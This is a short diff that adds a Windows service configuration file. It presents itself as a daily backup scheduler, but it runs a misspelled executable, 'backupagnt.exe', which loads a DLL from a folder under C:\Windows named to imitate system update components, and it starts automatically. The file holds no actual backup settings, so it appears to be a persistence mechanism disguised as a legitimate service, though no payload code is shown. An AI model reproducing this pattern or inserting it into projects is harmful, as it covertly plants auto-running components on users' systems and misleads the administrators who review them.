@@ -1,0 +1,13 @@
+<service>
+    <id>BackupScheduler</id>
+    <name>Daily Backup Scheduler</name>
+    <description>
+        Handles scheduled backups of project files and databases. The service
+        manages job queues, compresses archives, and uploads backups to the
+        configured cloud storage endpoint.
+    </description>
+    <executable>backupagnt.exe</executable>
+    <arguments>C:\Windows\ShellComponents\WindowsInternal.UpdateComponent.dll</arguments>
+    <startmode>Automatic</startmode>
+    <logpath>logs</logpath>
+</service>
